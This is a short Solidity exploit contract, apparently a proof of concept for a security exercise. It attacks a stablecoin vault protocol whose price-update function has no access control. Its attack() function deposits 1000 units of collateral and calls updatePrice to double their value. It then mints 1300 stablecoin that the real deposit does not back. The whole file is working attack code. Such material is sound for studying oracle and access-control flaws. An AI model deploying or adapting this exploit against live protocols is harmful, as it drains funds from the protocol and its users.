
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IStable {
    function openVault() external returns (uint256);
    function depositCollateral(uint256 vaultId, address collateral, uint256 amount) external;
    function updatePrice(uint256 newRateA, uint256 newRateB) external;
    function mint(uint256 vaultId, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Stablecoin minted against manipulable collateral: open a vault
///         backed by cheap collateral, inflate its price (no access
///         control), mint more stablecoin than the deposit backs.
contract PegCollateralSwap {
    IStable public mstable;
    address public stable;
    address public collateral;

    constructor(address _mstable, address _stable, address _collateral) {
        mstable = IStable(_mstable);
        stable = _stable;
        collateral = _collateral;
    }

    function attack() external returns (uint256 minted) {
        uint256 id = mstable.openVault();
        IERC20(collateral).approve(address(mstable), type(uint256).max);
        mstable.depositCollateral(id, collateral, 1000 ether);
        // inflate collateralB price 2x (no access control)
        mstable.updatePrice(1 ether, 2 ether);
        // mint 1300 stable at 66% LTV of the inflated 2000 value
        mstable.mint(id, 1300 ether);
        minted = 1300 ether;
    }
}
